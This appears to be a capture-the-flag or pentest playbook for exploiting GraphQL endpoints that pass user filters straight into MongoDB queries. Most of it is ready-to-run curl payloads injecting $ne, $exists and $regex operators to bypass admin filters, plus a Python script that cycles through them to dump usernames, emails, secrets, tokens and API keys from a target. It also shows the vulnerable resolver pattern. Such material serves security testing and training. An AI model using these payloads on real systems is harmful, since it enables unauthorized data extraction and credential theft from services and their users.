# GraphQL + NoSQL Injection — Combined Attack Playbook

When GraphQL sits in front of a MongoDB backend, filter arguments are often passed directly into `find()`/`filter()` calls, enabling NoSQL operator injection.

---

## Attack Chain

```
1. Discover endpoints (/graphql, /api/users, etc.)
2. Check client-side JS for filter structure (reveals injection format)
3. Introspect schema → find filterable args (String, JSON, Object types)
4. Inject MongoDB operators into those args
5. Enumerate ALL results — don't stop at first hit (decoys exist)
6. Validate flag format before reporting
```

---

## Step 1: Recon — Read Client-Side Scripts First

Before introspection, check `scripts.js` or similar frontend files. They often reveal:
- The exact filter JSON structure the app uses
- Which endpoint and GraphQL argument is injectable
- Which fields are hidden from the UI

```bash
curl -s TARGET/static/js/scripts.js | grep -E "query|search|filter|graphql|api"
```

**Example revealing pattern** (common in vulnerable apps):
```javascript
// Client-side filter — attacker can override this in direct requests:
query = `{ users(search: "${filterJSON}") { username email } }`
// where filterJSON is: {"email": {"$regex": ".*@domain.com"}, "is_admin": false}
```

---

## Step 2: Identify Injectable Arguments

```bash
# Full introspection
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name args{name type{name kind}}}}}}"}' \
  | python3 -m json.tool
```

**High-value targets:**
- `String` args named `search`, `filter`, `query`, `where` — these often accept raw JSON
- `JSON`/`Object` typed args — directly injectable
- Any arg whose default value in JS contains MongoDB operators (`$regex`, `$ne`)

---

## Step 3: Inject Operators — String Arg Pattern

**Most common pattern**: `String` arg parses your value with `json.loads()` and passes directly to MongoDB.

```bash
# Basic: override is_admin filter
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"{\\\"is_admin\\\": true}\") { username email flag } }"}'

# With operator: $ne false catches admins even with type mismatch
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"{\\\"is_admin\\\": {\\\"\\$ne\\\": false}}\") { username email flag } }"}'

# $exists: find all records with a flag field
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"{\\\"flag\\\": {\\\"\\$exists\\\": true}}\") { username email flag } }"}'

# No filter — dump everything
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"{}\") { username email flag is_admin } }"}'
```

**Also try the REST-style wrapper** (many apps have `/api/users` that wraps GraphQL):
```bash
curl -s -X POST TARGET/api/users -H "Content-Type: application/json" \
  -d '{"query":"{ users(search: \"{\\\"is_admin\\\": true}\") { username email flag } }"}'
```

---

## Step 4: JSON/Object Arg Pattern

```bash
# Variables with JSON-typed filter
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"query($f:JSON){users(filter:$f){username email flag}}","variables":{"f":{"is_admin":{"$ne":false}}}}'

# Inline operators (if variable type validation is strict)
curl -s -X POST TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{users(filter:{is_admin:{$ne:false}}){username email flag}}"}'
```

---

## Step 5: Exhaustive Enumeration Script

**Always enumerate ALL records** — sensitive data may be on a non-obvious record.

```python
#!/usr/bin/env python3
import requests, json, re, sys

TARGET = sys.argv[1]  # e.g., http://localhost:5003
# Pattern to detect sensitive tokens, secrets, API keys in responses
SECRET_RE = re.compile(r'[A-Za-z0-9_\-]{32,}|[a-f0-9]{64}', re.IGNORECASE)

def try_query(endpoint, query_str, label=""):
    """Try a GraphQL query string and print sensitive data found."""
    for url in [f"{TARGET}/graphql", f"{TARGET}/api/users"]:
        try:
            r = requests.post(url, json={"query": query_str}, timeout=10)
            data = r.json()
            text = json.dumps(data)
            # Print all records for analysis
            users = (data.get("data") or {}).get("users") or data.get("users", [])
            if users:
                print(f"[{label}] {url} → {len(users)} records:")
                for u in users:
                    print(f"  {u}")
                return users, data
        except Exception as e:
            pass
    return [], {}

# Try all filter variants
queries = [
    ('no-filter',   '{ users { username email secret token apiKey is_admin } }'),
    ('admin-true',  '{ users(search: "{\\"is_admin\\": true}") { username email secret token is_admin } }'),
    ('ne-false',    '{ users(search: "{\\"is_admin\\": {\\"$ne\\": false}}") { username email secret token } }'),
    ('secret-exists', '{ users(search: "{\\"secret\\": {\\"$exists\\": true}}") { username email secret } }'),
    ('all-users',   '{ users(search: "{\\"email\\": {\\"$regex\\": \\".*\\"}}") { username email secret token } }'),
]

for label, q in queries:
    results, _ = try_query(TARGET, q, label)
    if results:
        print(f"\n[!] Extracted {len(results)} records — review for sensitive data")
        break
```

---

## Step 6: Data Extraction Validation

```python
# Always request hidden fields that may contain sensitive data:
# secret, token, apiKey, password, flag, hash, key, credential
# Enumerate ALL records — sensitive data may be on any record, not the first
```

**Important**: Always request all available fields — hidden fields like `secret`, `token`, `apiKey`, `password`, `key` may not appear in the schema introspection but can still be queried.

---

## Common Patterns (Source Code Hints)

```python
# VULNERABLE — String arg parsed directly as MongoDB filter:
def resolve_users(self, info, search=None, ...):
    if search:
        criteria = json.loads(search)         # user-controlled
        query = query.filter(**criteria)       # → NoSQL injection

# ALSO VULNERABLE — GraphQL Boolean arg ignored, String filter used:
users = List(UserType, search=Argument(String), is_admin=Argument(Boolean))
# The is_admin Boolean arg may be UNUSED in the resolver — check resolver code!
```

**Key insight**: A GraphQL `is_admin: true` Boolean argument may have NO effect if the resolver ignores it. The actual injection must go through a String/JSON filter argument.

---

## Reference

- NoSQL payloads: `../../../injection/reference/nosql-injection-quickstart.md`
- GraphQL introspection: `graphql-quickstart.md`
- HackTricks: https://book.hacktricks.xyz/pentesting-web/graphql
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
